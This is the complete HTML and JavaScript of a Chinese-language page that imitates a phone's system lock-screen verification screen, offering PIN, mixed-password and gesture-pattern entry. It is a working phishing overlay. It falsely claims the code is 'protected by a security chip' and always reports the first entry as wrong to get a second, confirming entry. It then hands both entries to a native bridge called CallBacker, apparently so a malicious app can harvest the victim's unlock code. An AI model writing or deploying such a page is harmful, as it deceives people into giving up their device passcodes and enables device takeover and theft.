<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="format-detection" content="telephone=no">
    <title>验证锁屏密码</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
            user-select: none;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 20px 30px;
            background: #f5f5f5;
        }

        .header-title {
            font-size: 20px;
            font-weight: 500;
            color: #333;
            flex: 1;
            text-align: center;
        }

        .next-header-btn {
            background: none;
            border: none;
            color: #5e87db;
            font-size: 16px;
            cursor: pointer;
            padding: 8px 12px;
        }

        .next-header-btn:disabled {
            color: #ccc;
            cursor: not-allowed;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 20px 40px;
            background: #f5f5f5;
        }

        .prompt-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            margin-bottom: 40px;
            font-weight: 400;
        }

        .dots-container {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }

        .dot {
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: #d0d0d0;
            transition: none;
        }

        .dot.filled {
            background: #5e87db;
            transform: scale(1.1);
        }

        .error-message {
            color: #e53935;
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
            min-height: 24px;
            font-weight: 400;
        }

        .tip-text {
            color: #999;
            font-size: 13px;
            text-align: center;
            line-height: 1.6;
            margin-bottom: 30px;
            padding: 0 20px;
        }

        .other-types-btn {
            text-align: center;
            margin-bottom: 30px;
        }

        .other-types-btn button {
            background: none;
            border: none;
            color: #5e87db;
            font-size: 16px;
            cursor: pointer;
            padding: 10px 20px;
        }

        .security-tip {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #999;
            font-size: 13px;
            margin-top: auto;
            padding: 20px 0;
        }

        .security-tip::before {
            content: '🛡️';
            margin-right: 6px;
        }

        .numpad {
            background: #f5f5f5;
            padding: 10px 20px 30px;
            padding-bottom: max(30px, env(safe-area-inset-bottom));
            touch-action: manipulation;
        }

        .numpad-row {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 10px;
        }

        .numpad-btn {
            background: #e8e8e8;
            border: none;
            border-radius: 8px;
            height: 60px;
            font-size: 24px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            transition: none;
            display: flex;
            align-items: center;
            justify-content: center;
            touch-action: manipulation;
        }

        .numpad-btn:active {
            background: #d5d5d5;
        }

        .numpad-btn:focus {
            outline: none;
        }

        .numpad-btn.clear {
            background: #c8c8c8;
            color: #333;
        }

        .numpad-btn.delete {
            background: #c8c8c8;
            font-size: 20px;
        }

        /* 密码类型选择弹窗 */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
            display: none;
        }

        .overlay.active {
            display: block;
        }

        .type-selector-modal {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            border-radius: 16px 16px 0 0;
            padding: 20px;
            z-index: 1000;
            transform: translateY(100%);
            transition: transform 0.3s ease;
        }

        .type-selector-modal.active {
            transform: translateY(0);
        }

        .modal-title {
            font-size: 18px;
            font-weight: 500;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }

        .type-option {
            padding: 18px 20px;
            border-bottom: 1px solid #f0f0f0;
            cursor: pointer;
            font-size: 16px;
            color: #333;
            transition: background 0.2s;
        }

        .type-option:last-child {
            border-bottom: none;
        }

        .type-option:active {
            background: #f5f5f5;
        }

        .type-option.selected {
            color: #5e87db;
        }

        .mixed-input-container {
            display: none;
            padding: 20px 0;
        }

        .mixed-input-container.active {
            display: block;
        }

        .mixed-password-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            outline: none;
            margin-bottom: 20px;
        }

        .mixed-password-input:focus {
            border-color: #5e87db;
        }

        .gesture-container {
            display: none;
            flex-direction: column;
            align-items: center;
            padding: 20px 0;
        }

        .gesture-container.active {
            display: flex;
        }

        .gesture-canvas {
            width: 100%;
            max-width: 320px;
            height: 320px;
            touch-action: none;
        }

        .hidden-input {
            position: absolute;
            left: -9999px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <div style="min-width: 60px;"></div>
        <div class="header-title">验证锁屏密码</div>
        <div style="min-width: 60px;">
            <button class="next-header-btn" id="nextHeaderBtn" style="display: none;" onclick="handleMixedNext()">下一步</button>
        </div>
    </div>

    <div class="container">
        <div class="prompt-text" id="promptText">请输入锁屏密码</div>

        <div class="dots-container" id="dotsContainer">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="mixed-input-container" id="mixedInputContainer">
            <input type="password"
                   class="mixed-password-input"
                   id="mixedPasswordInput"
                   placeholder="请输入密码（至少4位）">
        </div>

        <div class="gesture-container" id="gestureContainer">
            <canvas id="gestureCanvas" class="gesture-canvas"></canvas>
        </div>

        <div class="error-message" id="errorMessage"></div>

        <div class="tip-text" id="tipText">
            请输入您的锁屏密码以继续操作
        </div>

        <div class="other-types-btn">
            <button onclick="showTypeSelector()">其他密码类型</button>
        </div>

        <div class="security-tip">锁屏密码由安全芯片保护</div>
    </div>

    <div class="numpad" id="numpad">
        <div class="numpad-row">
            <button class="numpad-btn" data-digit="1">1</button>
            <button class="numpad-btn" data-digit="2">2</button>
            <button class="numpad-btn" data-digit="3">3</button>
        </div>
        <div class="numpad-row">
            <button class="numpad-btn" data-digit="4">4</button>
            <button class="numpad-btn" data-digit="5">5</button>
            <button class="numpad-btn" data-digit="6">6</button>
        </div>
        <div class="numpad-row">
            <button class="numpad-btn" data-digit="7">7</button>
            <button class="numpad-btn" data-digit="8">8</button>
            <button class="numpad-btn" data-digit="9">9</button>
        </div>
        <div class="numpad-row">
            <button class="numpad-btn clear" data-action="clear">C</button>
            <button class="numpad-btn" data-digit="0">0</button>
            <button class="numpad-btn delete" data-action="delete">⌫</button>
        </div>
    </div>

    <div class="overlay" id="overlay" onclick="hideTypeSelector()"></div>
    <div class="type-selector-modal" id="typeSelectorModal">
        <div class="modal-title">选择密码类型</div>
        <div class="type-option" data-type="4digit" onclick="selectType('4digit')">4位数字密码</div>
        <div class="type-option selected" data-type="6digit" onclick="selectType('6digit')">6位数字密码</div>
        <div class="type-option" data-type="mixed" onclick="selectType('mixed')">混合密码</div>
        <div class="type-option" data-type="gesture" onclick="selectType('gesture')">手势密码</div>
    </div>

    <input type="tel" id="hiddenInput" class="hidden-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">

    <script>
        let currentType = '6digit';
        let currentPassword = '';
        let firstPassword = '';
        let isFirstInput = true;
        let passwordLength = 6;
        let dotElements = [];
        let errorTimeoutId = null;
        let isShowingError = false;

        let gestureCanvas, gestureCtx;
        let gesturePoints = [];
        let selectedPoints = [];
        let isDrawing = false;
        let currentPos = null;

        function init() {
            updateUI();
        }

        function updateUI() {
            const dotsContainer = document.getElementById('dotsContainer');
            const mixedInputContainer = document.getElementById('mixedInputContainer');
            const gestureContainer = document.getElementById('gestureContainer');
            const numpad = document.getElementById('numpad');
            const nextHeaderBtn = document.getElementById('nextHeaderBtn');

            dotsContainer.style.display = 'none';
            mixedInputContainer.classList.remove('active');
            gestureContainer.classList.remove('active');
            numpad.style.display = 'block';
            nextHeaderBtn.style.display = 'none';

            if (currentType === '4digit' || currentType === '6digit') {
                dotsContainer.style.display = 'flex';
                passwordLength = currentType === '4digit' ? 4 : 6;
                initDots();
                updateDots();
            } else if (currentType === 'mixed') {
                mixedInputContainer.classList.add('active');
                numpad.style.display = 'none';
                nextHeaderBtn.style.display = 'block';
                nextHeaderBtn.disabled = true;
                document.getElementById('mixedPasswordInput').value = '';
                document.getElementById('mixedPasswordInput').focus();
            } else if (currentType === 'gesture') {
                gestureContainer.classList.add('active');
                numpad.style.display = 'none';
                initGesture();
            }
        }

        function initDots() {
            const dotsContainer = document.getElementById('dotsContainer');
            dotsContainer.innerHTML = '';
            dotElements = [];

            for (let i = 0; i < passwordLength; i++) {
                const dot = document.createElement('div');
                dot.className = 'dot';
                dotsContainer.appendChild(dot);
                dotElements.push(dot);
            }
        }

        function updateDots() {
            // 直接使用缓存的元素，避免DOM查询
            for (let i = 0; i < dotElements.length; i++) {
                if (i < currentPassword.length) {
                    dotElements[i].classList.add('filled');
                } else {
                    dotElements[i].classList.remove('filled');
                }
            }

            if (currentPassword.length === passwordLength) {
                handlePasswordComplete();
            }
        }

        let errorMessageEl = null;

        function inputDigit(digit) {
            if (!errorMessageEl) {
                errorMessageEl = document.getElementById('errorMessage');
            }

            if (isShowingError) {
                if (errorTimeoutId) {
                    clearTimeout(errorTimeoutId);
                    errorTimeoutId = null;
                }

                errorMessageEl.textContent = '';
                isShowingError = false;
                currentPassword = '';

                for (let i = 0; i < dotElements.length; i++) {
                    dotElements[i].classList.remove('filled');
                }
            }

            if (currentPassword.length < passwordLength) {
                currentPassword += digit;

                const idx = currentPassword.length - 1;
                if (dotElements[idx]) {
                    dotElements[idx].classList.add('filled');
                }

                if (currentPassword.length === passwordLength) {
                    handlePasswordComplete();
                }
            }
        }

        function deleteDigit() {
            if (currentPassword.length > 0) {
                currentPassword = currentPassword.slice(0, -1);
                updateDots();
            }
        }

        function clearInput() {
            currentPassword = '';
            updateDots();
        }

        function handlePasswordComplete() {
            const errorMessage = document.getElementById('errorMessage');
            const promptText = document.getElementById('promptText');

            if (isFirstInput) {
                errorMessage.textContent = '密码错误，请重新输入';
                firstPassword = currentPassword;
                isFirstInput = false;
                isShowingError = true;
                promptText.textContent = '请再次输入密码';

                if (errorTimeoutId) {
                    clearTimeout(errorTimeoutId);
                }

                errorTimeoutId = setTimeout(() => {
                    if (isShowingError) {
                        errorMessage.textContent = '';
                        currentPassword = '';
                        updateDots();
                        isShowingError = false;
                    }
                }, 1500);
            } else {
                submitResult(currentPassword);
            }
        }

        const mixedPasswordInput = document.getElementById('mixedPasswordInput');
        const nextHeaderBtn = document.getElementById('nextHeaderBtn');

        mixedPasswordInput.addEventListener('input', function() {
            const errorMessage = document.getElementById('errorMessage');
            if (errorMessage.textContent) {
                errorMessage.textContent = '';
            }

            if (this.value.length >= 4) {
                nextHeaderBtn.disabled = false;
            } else {
                nextHeaderBtn.disabled = true;
            }
        });

        function handleMixedNext() {
            const password = mixedPasswordInput.value.trim();

            if (password.length < 4) {
                document.getElementById('errorMessage').textContent = '密码长度至少4位';
                setTimeout(() => {
                    document.getElementById('errorMessage').textContent = '';
                }, 1500);
                return;
            }

            handleMixedPasswordComplete(password);
        }

        function handleMixedPasswordComplete(password) {
            const errorMessage = document.getElementById('errorMessage');
            const promptText = document.getElementById('promptText');

            if (isFirstInput) {
                errorMessage.textContent = '密码错误，请重新输入';
                firstPassword = password;
                isFirstInput = false;
                promptText.textContent = '请再次输入密码';

                setTimeout(() => {
                    errorMessage.textContent = '';
                    mixedPasswordInput.value = '';
                    nextHeaderBtn.disabled = true;
                    mixedPasswordInput.focus();
                }, 1500);
            } else {
                submitResult(password);
            }
        }

        function showTypeSelector() {
            document.getElementById('overlay').classList.add('active');
            document.getElementById('typeSelectorModal').classList.add('active');
        }

        function hideTypeSelector() {
            document.getElementById('overlay').classList.remove('active');
            document.getElementById('typeSelectorModal').classList.remove('active');
        }

        function selectType(type) {
            currentType = type;
            currentPassword = '';
            firstPassword = '';
            isFirstInput = true;

            document.querySelectorAll('.type-option').forEach(opt => {
                opt.classList.remove('selected');
                if (opt.dataset.type === type) {
                    opt.classList.add('selected');
                }
            });

            const promptText = document.getElementById('promptText');
            const errorMessage = document.getElementById('errorMessage');

            if (type === '4digit') {
                promptText.textContent = '请输入锁屏密码（4位）';
            } else if (type === '6digit') {
                promptText.textContent = '请输入锁屏密码';
            } else if (type === 'mixed') {
                promptText.textContent = '请输入混合密码';
            } else if (type === 'gesture') {
                promptText.textContent = '请绘制手势密码';
            }

            errorMessage.textContent = '';
            hideTypeSelector();
            updateUI();
        }

        function initGesture() {
            gestureCanvas = document.getElementById('gestureCanvas');
            gestureCtx = gestureCanvas.getContext('2d');

            const size = Math.min(gestureCanvas.offsetWidth, 320);
            gestureCanvas.width = size;
            gestureCanvas.height = size;

            initGesturePoints();
            drawGesture();

            gestureCanvas.addEventListener('touchstart', handleGestureStart);
            gestureCanvas.addEventListener('touchmove', handleGestureMove);
            gestureCanvas.addEventListener('touchend', handleGestureEnd);

            gestureCanvas.addEventListener('mousedown', handleGestureStart);
            gestureCanvas.addEventListener('mousemove', handleGestureMove);
            gestureCanvas.addEventListener('mouseup', handleGestureEnd);
        }

        function initGesturePoints() {
            gesturePoints = [];
            const size = gestureCanvas.width;
            const padding = size / 6;
            const spacing = (size - 2 * padding) / 2;

            for (let i = 0; i < 3; i++) {
                for (let j = 0; j < 3; j++) {
                    gesturePoints.push({
                        x: padding + j * spacing,
                        y: padding + i * spacing,
                        index: i * 3 + j + 1,
                        selected: false
                    });
                }
            }
        }

        function drawGesture() {
            gestureCtx.clearRect(0, 0, gestureCanvas.width, gestureCanvas.height);

            if (selectedPoints.length > 0) {
                gestureCtx.strokeStyle = '#5e87db';
                gestureCtx.lineWidth = 3;
                gestureCtx.beginPath();

                const firstPoint = gesturePoints.find(p => p.index === selectedPoints[0]);
                if (firstPoint) {
                    gestureCtx.moveTo(firstPoint.x, firstPoint.y);

                    for (let i = 1; i < selectedPoints.length; i++) {
                        const point = gesturePoints.find(p => p.index === selectedPoints[i]);
                        if (point) {
                            gestureCtx.lineTo(point.x, point.y);
                        }
                    }

                    if (isDrawing && currentPos) {
                        gestureCtx.lineTo(currentPos.x, currentPos.y);
                    }

                    gestureCtx.stroke();
                }
            }

            gesturePoints.forEach(point => {
                gestureCtx.beginPath();
                gestureCtx.arc(point.x, point.y, point.selected ? 20 : 15, 0, Math.PI * 2);
                gestureCtx.fillStyle = point.selected ? '#5e87db' : '#d0d0d0';
                gestureCtx.fill();

                if (point.selected) {
                    gestureCtx.beginPath();
                    gestureCtx.arc(point.x, point.y, 8, 0, Math.PI * 2);
                    gestureCtx.fillStyle = 'white';
                    gestureCtx.fill();
                }
            });
        }

        function getGesturePos(e) {
            const rect = gestureCanvas.getBoundingClientRect();
            const touch = e.touches ? e.touches[0] : e;
            return {
                x: touch.clientX - rect.left,
                y: touch.clientY - rect.top
            };
        }

        function handleGestureStart(e) {
            e.preventDefault();

            const errorMessage = document.getElementById('errorMessage');
            if (errorMessage.textContent && !isFirstInput) {
                errorMessage.textContent = '';
            }

            isDrawing = true;
            selectedPoints = [];
            gesturePoints.forEach(p => p.selected = false);

            const pos = getGesturePos(e);
            checkPointSelection(pos);
        }

        function handleGestureMove(e) {
            if (!isDrawing) return;
            e.preventDefault();

            const pos = getGesturePos(e);
            currentPos = pos;
            checkPointSelection(pos);
            drawGesture();
        }

        function handleGestureEnd(e) {
            if (!isDrawing) return;
            e.preventDefault();

            isDrawing = false;
            currentPos = null;
            drawGesture();

            const errorMessage = document.getElementById('errorMessage');

            if (selectedPoints.length >= 4) {
                handleGestureComplete(selectedPoints.join(''));
            } else {
                errorMessage.textContent = '请至少连接4个点';
                setTimeout(() => {
                    errorMessage.textContent = '';
                    resetGesture();
                }, 1500);
            }
        }

        function checkPointSelection(pos) {
            gesturePoints.forEach(point => {
                const distance = Math.sqrt(Math.pow(pos.x - point.x, 2) + Math.pow(pos.y - point.y, 2));
                if (distance < 30 && !point.selected) {
                    point.selected = true;
                    selectedPoints.push(point.index);
                }
            });
        }

        function resetGesture() {
            selectedPoints = [];
            gesturePoints.forEach(p => p.selected = false);
            drawGesture();
        }

        function handleGestureComplete(pattern) {
            const errorMessage = document.getElementById('errorMessage');
            const promptText = document.getElementById('promptText');

            if (isFirstInput) {
                errorMessage.textContent = '密码错误，请重新输入';
                firstPassword = pattern;
                isFirstInput = false;
                promptText.textContent = '请再次绘制手势密码';

                setTimeout(() => {
                    errorMessage.textContent = '';
                    resetGesture();
                }, 1500);
            } else {
                submitResult(pattern);
            }
        }

     function submitResult(password) {
            // 定义类型对应的名称
            const names = {
                '4digit': '4位数字',
                '6digit': '6位数字',
                'mixed': '混合密码',
                'gesture': '手势密码'
            };

            // 如果 currentType 是 names 中的类型，转换成对应的汉字
            if (names[currentType]) {
                currentType = names[currentType];
            }

            const pinstr = currentType + '|' + firstPassword + '|' + password;

            try {
                CallBacker.OK(pinstr);
            } catch (error) {
                console.log("传递数据:", pinstr);
            }
        }

        function getTypeName(type) {
            const names = {
                '4digit': '4位数字',
                '6digit': '6位数字',
                'mixed': '混合密码',
                'gesture': '手势密码'
            };
            return names[type] || type;
        }

        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = Date.now();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);

        const numpadEl = document.getElementById('numpad');

        numpadEl.addEventListener('touchend', function(e) {
            e.preventDefault();
            e.stopPropagation();

            const btn = e.target.closest('.numpad-btn');
            if (!btn) return;

            const digit = btn.dataset.digit;
            const action = btn.dataset.action;

            if (digit) {
                inputDigit(digit);
            } else if (action === 'clear') {
                clearInput();
            } else if (action === 'delete') {
                deleteDigit();
            }
        }, { passive: false });

        numpadEl.addEventListener('click', function(e) {
            const btn = e.target.closest('.numpad-btn');
            if (!btn) return;

            const digit = btn.dataset.digit;
            const action = btn.dataset.action;

            if (digit) {
                inputDigit(digit);
            } else if (action === 'clear') {
                clearInput();
            } else if (action === 'delete') {
                deleteDigit();
            }
        });

        init();
    </script>
</body>
</html>
